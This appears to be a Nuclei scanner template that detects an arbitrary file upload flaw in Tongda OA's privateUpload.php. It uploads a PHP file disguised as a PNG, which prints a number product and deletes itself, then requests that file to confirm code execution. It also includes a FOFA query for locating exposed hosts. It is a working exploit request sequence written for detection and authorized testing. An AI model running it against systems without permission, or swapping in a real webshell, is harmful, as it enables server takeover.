http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - status_code_2 == 200
    - contains(body_2, '{{result}}')
    type: dsl
  raw:
  - 'POST /general/vmeet/privateUpload.php?fileName={{filename}}+ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----{{boundary}}


    ------{{boundary}}

    Content-Disposition: form-data; name="Filedata"; filename="png.png"

    Content-Type: image/png


    <?php print({{num1}}*{{num2}});unlink(__FILE__);?>

    ------{{boundary}}--

    '
  - 'GET /general/vmeet/upload/temp/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: tongda-oa-privateupload-file-upload
info:
  author: Co5mos
  description: "\u901A\u8FBEOA\u7684 `privateUpload.php` \u63A5\u53E3\u5B58\u5728\u524D\
    \u53F0\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\
    \u53EF\u4EE5\u901A\u8FC7\u8BE5\u6F0F\u6D1E\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\
    \uFF0C\u4ECE\u800C\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\u3002\n"
  metadata:
    fofa-query: "app=\"TDXK-\u901A\u8FBEOA\""
  name: Tongda OA privateUpload.php Arbitrary File Upload
  severity: critical
  tags: tongda, file-upload, rce
variables:
  boundary: '{{rand_base(33)}}'
  filename: '{{rand_base(6)}}.php'
  num1: '{{rand_int(10000, 20000)}}'
  num2: '{{rand_int(10000, 20000)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
